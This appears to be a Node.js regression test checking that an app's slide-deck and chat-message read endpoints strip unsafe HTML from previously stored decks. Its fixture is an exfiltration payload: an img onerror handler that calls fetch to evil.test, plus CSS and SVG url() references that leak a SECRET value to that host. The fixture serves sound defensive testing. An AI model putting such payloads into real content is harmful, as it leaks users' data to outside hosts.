// md-exfil T5 (r2): slides stored BEFORE the sanitizer was hardened are returned clean without a re-save, on both read
// paths: GET /api/decks/:id and the deck-html snapshots inside GET /api/sessions/:id/messages. Stored rows are untouched.
//
// Real Express app on an ephemeral port + local test Postgres (same requirements as tests/routes/decks.test.mjs).
//   node --test tests/routes/readSanitize.test.mjs
import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { randomUUID } from 'node:crypto'
import pg from 'pg'
import { startFakeGateway } from '../../scripts/fake-gateway.mjs'

const env = process.env
env.PGHOST ||= '127.0.0.1'
env.PGPORT ||= '55432'
env.PGUSER ||= 'ai_prism'
env.PGPASSWORD ||= 'ai_prism'
env.PGDATABASE ||= 'ai_prism'
env.PGSSLMODE ||= 'disable'
env.LOCAL_DEV_MODE = '1'
env.LOCAL_PGVECTOR = '1'
env.APPKIT_BOOT = '1'
env.RATE_LIMIT_API_PER_MIN = '0'
env.RATE_LIMIT_TURNS_PER_MIN = '0'
delete env.DATABRICKS_CLIENT_ID
delete env.DATABRICKS_CLIENT_SECRET
delete env.DATABRICKS_APP_NAME
delete env.DATABRICKS_APP_PORT
delete env.DATABRICKS_APP_URL

const LOCAL_HOSTS = new Set(['127.0.0.1', 'localhost', '::1'])
const USER = `t5r2-${randomUUID().slice(0, 8)}@test.invalid`

async function skipReason() {
  if (!LOCAL_HOSTS.has(env.PGHOST) && env.ISOLATION_TEST_ANY_HOST !== '1') return `PGHOST=${env.PGHOST} is not local`
  const c = new pg.Client({ host: env.PGHOST, port: Number(env.PGPORT), user: env.PGUSER, password: env.PGPASSWORD, database: env.PGDATABASE, ssl: false, connectionTimeoutMillis: 2000 })
  try {
    await c.connect()
    const ext = await c.query(`SELECT 1 FROM pg_available_extensions WHERE name = 'vector'`)
    return ext.rows.length ? null : 'pgvector is not installed in this Postgres'
  } catch (e) {
    return `no Postgres at ${env.PGHOST}:${env.PGPORT} (${e.code || e.message}); run npm run local:up`
  } finally {
    await c.end().catch(() => {})
  }
}
const SKIP = (await skipReason()) || false

const UNSAFE =
  '<section style="padding:8px"><h1>Keep</h1><img src="https://evil.test/p.png?d=SECRET" onerror="fetch(\'https://evil.test/h\')">' +
  '<svg><rect cursor="url(https://evil.test/c.png?d=SECRET), auto" fill="#123"/></svg><div style="background:url(https://evil.test/b.png)">x</div></section>'
const assertClean = (html) => {
  assert.doesNotMatch(html, /evil\.test|SECRET|onerror/i, html)
  assert.match(html, /<h1>Keep<\/h1>/)
  assert.match(html, /padding:8px/)
}

let gw, server, base, db, sid, deckId
before(async () => {
  if (SKIP) return
  gw = await startFakeGateway({ port: 0 })
  env.DATABRICKS_HOST = gw.url
  const { app } = await import('../../server/index.js')
  db = await import('../../server/db.ts')
  await new Promise((resolve) => {
    server = app.listen(0, '127.0.0.1', resolve)
  })
  base = `http://127.0.0.1:${server.address().port}`
  await fetch(`${base}/api/me`, { headers: { 'x-forwarded-email': USER } })
  sid = await db.createSession(USER, 'token', 'T5 read', 'databricks-claude-sonnet-5-5', null, [])
  deckId = await db.createDeck(USER, 'token', sid, 'Old deck', [UNSAFE, { html: UNSAFE, notes: 'n' }], { format: 'html' })
  await db.addMessage(USER, 'token', {
    sessionId: sid,
    role: 'assistant',
    content: 'here {{block:0}}',
    blocks: [
      { type: 'deck-html', title: 'Old', slides: [UNSAFE, { html: UNSAFE, notes: 'n' }] },
      { type: 'table', columns: ['a'], rows: [['<b>x</b>']] },
    ],
  })
})

after(async () => {
  if (SKIP) return
  await new Promise((r) => {
    server?.close(r)
    server?.closeAllConnections()
  })
  await gw?.close()
  const c = new pg.Client({ host: env.PGHOST, port: Number(env.PGPORT), user: env.PGUSER, password: env.PGPASSWORD, database: env.PGDATABASE, ssl: false })
  await c.connect()
  try {
    await c.query(`DELETE FROM chat_sessions WHERE user_email = $1`, [USER])
  } finally {
    await c.end()
  }
})

const get = async (path) => (await (await fetch(`${base}${path}`, { headers: { 'x-forwarded-email': USER } })).json())

test('GET /api/decks/:id returns an old unsafe deck clean, notes kept, row untouched', { skip: SKIP }, async () => {
  const { deck } = await get(`/api/decks/${deckId}`)
  assertClean(deck.slides[0])
  assertClean(deck.slides[1].html)
  assert.equal(deck.slides[1].notes, 'n')
  const raw = await db.getDeck(USER, 'token', deckId)
  assert.match(raw.slides[0], /evil\.test/, 'stored row is not rewritten')
})

test('GET /api/sessions/:id/messages returns the deck-html snapshot of an old message clean; other blocks untouched', { skip: SKIP }, async () => {
  const { messages } = await get(`/api/sessions/${sid}/messages`)
  const m = messages.find((x) => x.role === 'assistant')
  const deck = m.blocks.find((b) => b.type === 'deck-html')
  assertClean(deck.slides[0])
  assertClean(deck.slides[1].html)
  assert.equal(deck.slides[1].notes, 'n')
  assert.deepEqual(m.blocks.find((b) => b.type === 'table'), { type: 'table', columns: ['a'], rows: [['<b>x</b>']] })
  assert.equal(m.content, 'here {{block:0}}')
})
